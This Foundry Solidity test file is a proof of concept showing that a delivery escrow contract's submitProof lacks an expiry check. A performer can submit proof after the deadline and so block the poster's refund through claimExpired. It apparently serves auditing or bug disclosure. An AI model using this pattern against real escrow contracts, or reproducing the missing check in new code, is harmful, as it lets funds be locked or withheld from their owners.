// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {DeliveryEscrow} from "../src/DeliveryEscrow.sol";
import {IMissionEscrow} from "../src/interfaces/IMissionEscrow.sol";
import {DeliveryMissionFactory} from "../src/DeliveryMissionFactory.sol";
import {PaymentRouter} from "../src/PaymentRouter.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {DisputeResolver} from "../src/DisputeResolver.sol";

contract ExpiredProofPoC is Test {
    DeliveryEscrow escrow;
    MockERC20 token;
    DeliveryMissionFactory factory;
    PaymentRouter router;
    DisputeResolver resolver;

    address poster = address(1);
    address performer = address(2);
    address admin = address(3);
    address protocolTreasury = address(4);

    function setUp() public {
        token = new MockERC20("USDC", "USDC", 6);

        router = new PaymentRouter(
            address(token),
            protocolTreasury,
            admin, // resolverTreasury
            admin, // labsTreasury
            admin
        );

        resolver = new DisputeResolver(
            address(token),
            admin,
            admin,
            protocolTreasury,
            admin // resolverTreasury
        );

        factory = new DeliveryMissionFactory(address(router));

        vm.prank(admin);
        router.setMissionFactory(address(factory));

        // Also mock the setAcceptedToken for the router
        vm.prank(admin);
        router.setAcceptedToken(address(token), true);

        token.mint(poster, 1000e6);

        vm.startPrank(poster);
        token.approve(address(factory), 1000e6);
        uint256 missionId = factory.createDeliveryMission(
            address(token),
            100e6,
            uint40(block.timestamp + 1 days),
            address(0),
            bytes32(0),
            bytes32(0)
        );
        vm.stopPrank();

        address escrowAddr = factory.missions(missionId);
        escrow = DeliveryEscrow(escrowAddr);

        DeliveryEscrow.DeliveryParams memory params;
        DeliveryEscrow.DeliveryWaypoint[] memory waypoints = new DeliveryEscrow.DeliveryWaypoint[](0);
        vm.prank(address(factory));
        escrow.initializeDelivery(params, waypoints);
    }

    function test_performerCanSubmitProofAfterExpiryAndBlockRefund() public {
        // Performer accepts the mission
        vm.prank(performer);
        escrow.acceptMission();

        // Time passes, deadline expires
        vm.warp(block.timestamp + 1 days + 1);

        // Performer maliciously submits proof AFTER deadline
        // DeliveryEscrow overridden submitProof lacks `notExpired` modifier!
        vm.prank(performer);
        escrow.submitProof(bytes32("proof"));

        // State is now Submitted
        assertEq(uint(escrow.getRuntime().state), uint(IMissionEscrow.MissionState.Submitted));

        // Poster tries to claim expired funds but gets blocked
        vm.prank(poster);
        vm.expectRevert(IMissionEscrow.InvalidState.selector);
        escrow.claimExpired();
    }
}
